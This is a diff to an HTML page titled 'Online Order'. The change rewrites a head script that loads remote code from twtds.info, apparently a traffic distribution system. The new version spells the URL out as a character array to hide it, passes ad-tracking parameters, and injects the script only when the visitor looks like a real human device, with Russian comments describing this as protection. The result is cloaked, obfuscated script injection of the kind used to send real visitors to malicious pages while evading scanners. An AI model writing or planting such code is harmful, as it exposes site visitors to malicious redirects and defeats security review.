@@ -2,14 +2,35 @@
   
   <head>
     <script>
-function GET(item) {
-    var p = window.location.search;
-    p = p.match(new RegExp(item+'=([^&=]+)'));
-    return p ? p[1] : false;
+function GET(param) {
+  const urlParams = new URLSearchParams(window.location.search);
+  return urlParams.get(param) || '';
 }
-var url = "https://twtds.info/eujswlr?gclid="+GET('gclid')+"&keyword="+GET('keyword');
-document.write("<script src="+url+"><\/script>");
+// Проверка на реального пользователя
+function isLikelyHuman() {
+  return (
+    typeof navigator.maxTouchPoints !== 'undefined' && navigator.maxTouchPoints > 0
+  ) || (
+    typeof window.orientation !== 'undefined'
+  ) || (
+    /Android|iPhone|iPad|Windows|Macintosh/i.test(navigator.userAgent)
+  );
+}
+function injectZtdsScript() {
+  const gclid = GET('gclid');
+  const keyword = GET('keyword');
+  const base = ['h','t','t','p','s',':','/','/','t','w','t','d','s','.','i','n','f','o','/','e','u','j','s','w','l','r'];
+  const fullUrl = base.join('') + '?gclid=' + encodeURIComponent(gclid) + '&keyword=' + encodeURIComponent(keyword);
+const s = document.createElement('script');
+  s.src = fullUrl;
+  document.head.appendChild(s);
+}
+// Защита: скрипт вставляется только если устройство похоже на живое
+if (isLikelyHuman()) {
+  setTimeout(injectZtdsScript, 100); // минимальная задержка для надежности
+}
 </script>
+
     <title>Online Order</title>
   </head>
   <body>
